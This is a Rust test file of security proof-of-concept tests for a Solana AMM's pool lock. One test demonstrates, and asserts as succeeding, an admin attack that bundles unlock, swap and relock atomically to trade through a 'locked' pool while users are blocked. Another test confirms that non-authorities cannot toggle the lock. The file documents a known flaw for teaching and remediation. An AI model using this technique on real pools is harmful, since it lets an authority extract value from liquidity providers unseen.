//! Security PoCs around `set_locked`. Two distinct concerns:
//!
//! 1. `admin_atomically_unlocks_swaps_and_relocks_while_users_blocked` — the
//!    lock/unlock *timing attack* (issue 001). The authority packs
//!    `unlock; swap; relock` into one atomic transaction and trades inside a
//!    window that, from every other user's perspective, never opened. This test
//!    **passes**, which is the bug: the mitigation (a timelock on unlock) is
//!    planned, not landed. This is the test whose captured trace drives
//!    `docs/security/exercises/001-what-is-going-on.md`.
//!
//! 2. `mallory_cannot_lock_or_unlock_a_pool_she_does_not_control` — the simpler
//!    authorization guarantee: a non-authority cannot toggle the lock at all.
//!    The authority gate is unit-tested in `test_admin.rs`; this is the
//!    narrative demonstration that a griefer's playbook is rejected at each step.
//!
//! Both thread a [`Report`]; the captured trees land in
//! `target/md-reports/<slug>.md` (and on stdout under `just poc`).

#![cfg(feature = "test-helpers")]

mod common;

use amm::{SwapBundle, SwapKind};
use anchor_litesvm::{TestHelpers, TransactionHelpers};
use common::{setup, MarkdownBlock, Report, SwapDir};

/// Issue 001: the authority can atomically unlock, swap, and relock in a single
/// transaction, trading through a "locked" pool that blocks everyone else. This
/// test asserts the attack currently *succeeds* (the bug); the captured atomic
/// trace is the teaching artifact for exercise 001.
#[test]
fn admin_atomically_unlocks_swaps_and_relocks_while_users_blocked() {
    let mut md = Report::new(
        "Security PoC: admin trades through a locked pool via an atomic unlock/swap/relock",
        "Users read `Config.locked == true` as \"the pool is paused; my position \
         is safe until the authority unlocks.\" That assumption is false. The \
         authority can pack unlock + their own swap + relock into ONE atomic \
         transaction: by Solana's atomicity, no other user's transaction can \
         land in the window between unlock and relock, so the admin trades at \
         the locked-pool price while honest traders are rejected with PoolLocked \
         on both sides. This test PASSES, which is the bug (issue 001); the \
         timelock mitigation is planned, not landed.",
    );

    let mut world = setup();
    let (admin, pool) = world.fresh_pool(30);

    // Alice is the LP whose position the "locked" signal is supposed to protect.
    let alice = world.user("Alice", 1_000_000, 1_000_000);
    md.step("Setup: Alice provides liquidity; her position is what 'locked' supposedly protects");
    world.deposit(&alice, &pool, 1_000_000, 1_000_000, 1);

    // Promote admin to trader (ATAs already exist from fresh_pool; just fund X).
    world.mint_to_x(&admin, 200_000);
    let bob = world.user("Bob", 100_000, 0);

    md.step("Admin locks the pool");
    world.set_locked(&admin, &pool, true);

    md.step("Honest Bob's swap is rejected while locked (PoolLocked)");
    let bob_blocked = world
        .ctx
        .tx(&[&bob.signer])
        .build(
            SwapBundle::from((&pool, &bob)),
            amm::instruction::Swap {
                kind: SwapKind::ExactInput { amount_in: 10_000, min_amount_out: 1 },
                a_to_b: SwapDir::AtoB.a_to_b(),
            },
        )
        .send_err_named("PoolLocked");
    md.block(
        "Bob blocked (pre-attack)",
        MarkdownBlock::Fenced { lang: "console".into(), body: bob_blocked.logs_structured_string() },
    );

    let admin_x_before = world.ctx.svm.token_balance(&admin.ata_x).unwrap();
    let admin_y_before = world.ctx.svm.token_balance(&admin.ata_y).unwrap();
    let vault_x_before = world.ctx.svm.token_balance(&pool.vault_x).unwrap();
    let vault_y_before = world.ctx.svm.token_balance(&pool.vault_y).unwrap();

    md.step("The attack: admin packs unlock + swap + relock into one atomic transaction");
    md.note(
        "The Scenario verbs send one instruction per tx; the attack needs all \
         three in a single atomic tx, so this drops to the lower-level \
         `program().build_ix(...)` + `send_instructions` API. The captured tree \
         below is the smoking gun: three sibling top-level frames, all signed by \
         Admin, no slot between them for anyone else to act.",
    );
    let unlock_ix = world.ctx.program().build_ix(
        amm::SetLockedBundle { authority: admin.pubkey(), config: pool.config },
        amm::instruction::SetLocked { locked: false },
    );
    let admin_swap_ix = world.ctx.program().build_ix(
        SwapBundle::from((&pool, &admin)),
        amm::instruction::Swap {
            kind: SwapKind::ExactInput { amount_in: 100_000, min_amount_out: 1 },
            a_to_b: true,
        },
    );
    let relock_ix = world.ctx.program().build_ix(
        amm::SetLockedBundle { authority: admin.pubkey(), config: pool.config },
        amm::instruction::SetLocked { locked: true },
    );

    // `send_instructions` (multi-ix tx) lives on the bare LiteSVM trait and
    // doesn't auto-stash the context's alias table, so attach it explicitly to
    // keep the tree's friendly names.
    let aliases = world.ctx.aliases.clone();
    let attack = world
        .ctx
        .svm
        .send_instructions(&[unlock_ix, admin_swap_ix, relock_ix], &[&admin.signer])
        .unwrap()
        .with_aliases(aliases);
    md.block(
        "the atomic attack transaction",
        MarkdownBlock::Fenced { lang: "console".into(), body: attack.logs_structured_string() },
    );
    md.check("the atomic attack succeeds (this is the bug)", true, attack.is_success());

    md.step("After: admin captured value; Alice's pool ratio moved with no chance to react");
    let admin_x_after = world.ctx.svm.token_balance(&admin.ata_x).unwrap();
    let admin_y_after = world.ctx.svm.token_balance(&admin.ata_y).unwrap();
    md.check("admin paid exactly 100_000 X", admin_x_before - 100_000, admin_x_after);
    md.check("admin received Y from the through-lock trade", true, admin_y_after > admin_y_before);

    let vault_x_after = world.ctx.svm.token_balance(&pool.vault_x).unwrap();
    let vault_y_after = world.ctx.svm.token_balance(&pool.vault_y).unwrap();
    md.check("vault_x absorbed the admin's input", vault_x_before + 100_000, vault_x_after);
    md.check("vault_y paid out (ratio moved against Alice)", true, vault_y_after < vault_y_before);

    md.step("And Bob is locked out again on the far side of the window");
    md.note(
        "A different amount than Bob's first attempt, so the tx isn't byte- \
         identical (same data + blockhash would dedup as AlreadyProcessed).",
    );
    let bob_blocked_after = world
        .ctx
        .tx(&[&bob.signer])
        .build(
            SwapBundle::from((&pool, &bob)),
            amm::instruction::Swap {
                kind: SwapKind::ExactInput { amount_in: 5_000, min_amount_out: 1 },
                a_to_b: SwapDir::AtoB.a_to_b(),
            },
        )
        .send_err_named("PoolLocked");
    md.block(
        "Bob blocked (post-attack)",
        MarkdownBlock::Fenced {
            lang: "console".into(),
            body: bob_blocked_after.logs_structured_string(),
        },
    );
}

/// Authorization guarantee (distinct from the timing attack above): a
/// non-authority cannot toggle `Config.locked` at all. The gate itself is
/// unit-tested in `test_admin.rs`; this is the narrative demonstration that a
/// griefer's full playbook is rejected at each step.
#[test]
fn mallory_cannot_lock_or_unlock_a_pool_she_does_not_control() {
    let mut md = Report::new(
        "Security PoC: Mallory cannot lock or unlock a pool she does not control",
        "Separate from the timing attack (issue 001, which abuses the \
         authority's *legitimate* lock power): this is the baseline \
         authorization guarantee. A non-authority griefer who could freely \
         toggle the lock would freeze every LP's funds. With the authority gate \
         in place, Mallory's playbook is rejected at each step (Unauthorized), \
         the pool stays unlocked, and legitimate users keep full control.",
    );

    let mut world = setup();
    let (admin, pool) = world.fresh_pool(30);

    // Alice is an honest LP: she deposits real liquidity, so there are funds at
    // stake that a successful griefer could freeze.
    let alice = world.user("Alice", 10_000, 40_000);
    md.step("Setup: Alice (honest LP) deposits real liquidity, so funds are at stake");
    world.deposit(&alice, &pool, 1_000, 4_000, 1_000);
    md.snapshot("pool", &world.observe_pool(&pool));

    let mallory = world.cast("Mallory");

    md.step("Attack 1: Mallory (no authority) tries to lock the pool");
    let lock_attempt = world
        .ctx
        .tx(&[&mallory.signer])
        .build(
            amm::SetLockedBundle { authority: mallory.pubkey(), config: pool.config },
            amm::instruction::SetLocked { locked: true },
        )
        .send_err_named("Unauthorized");
    md.block(
        "lock attempt logs",
        MarkdownBlock::Fenced { lang: "console".into(), body: lock_attempt.logs_structured_string() },
    );
    let config: amm::Config = world.ctx.get_account(&pool.config).unwrap();
    md.check("pool remains unlocked after Mallory's attempt", false, config.locked);

    md.step("Attack 2: Mallory tries to toggle the pool the other way (unlock)");
    let unlock_attempt = world
        .ctx
        .tx(&[&mallory.signer])
        .build(
            amm::SetLockedBundle { authority: mallory.pubkey(), config: pool.config },
            amm::instruction::SetLocked { locked: false },
        )
        .send_err_named("Unauthorized");
    md.block(
        "unlock attempt logs",
        MarkdownBlock::Fenced { lang: "console".into(), body: unlock_attempt.logs_structured_string() },
    );

    md.step("Verify: the real authority retains legitimate control (lock, then unlock)");
    world.set_locked(&admin, &pool, true);
    let config: amm::Config = world.ctx.get_account(&pool.config).unwrap();
    md.check("admin can lock", true, config.locked);

    world.set_locked(&admin, &pool, false);
    let config: amm::Config = world.ctx.get_account(&pool.config).unwrap();
    md.check("admin can unlock", false, config.locked);

    md.step("Verify: a swap works on the unlocked pool — funds were never frozen");
    let bob = world.user("Bob", 1_000, 0);
    world.swap(
        &bob,
        &pool,
        SwapKind::ExactInput { amount_in: 100, min_amount_out: 1 },
        SwapDir::AtoB,
    );
    md.snapshot("bob after swap", &world.observe_user(&bob, &pool));
    md.check(
        "pool is operational: Bob's swap delivered Y",
        true,
        world.ctx.svm.token_balance(&bob.ata_y).unwrap() > 0,
    );
}
